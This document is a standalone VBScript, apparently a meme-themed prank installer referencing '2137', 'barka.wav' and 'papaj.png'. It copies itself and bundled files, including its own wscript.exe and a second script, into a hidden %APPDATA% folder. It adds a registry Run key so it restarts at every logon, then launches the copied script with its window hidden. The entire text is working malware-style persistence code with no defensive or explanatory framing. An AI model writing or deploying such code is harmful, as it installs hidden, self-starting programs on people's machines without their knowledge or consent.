set s=CreateObject("WScript.Shell")
set f=CreateObject("Scripting.FileSystemObject")
p=s.ExpandEnvironmentStrings("%APPDATA%")+"\2137"
d=p+"\"
s.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\2137",d+"wscript.exe "+d+"2137.vbs","REG_SZ"
if not f.FolderExists(p)then
f.CreateFolder p
f.CopyFile ".\2137.vbs",d
f.CopyFile ".\wall.vbs",d
f.CopyFile ".\wscript.exe",d
f.CopyFile ".\barka.wav",d
f.CopyFile ".\papaj.png",d
end if
s.Run d+"wscript.exe "+d+"2137.vbs", 0, False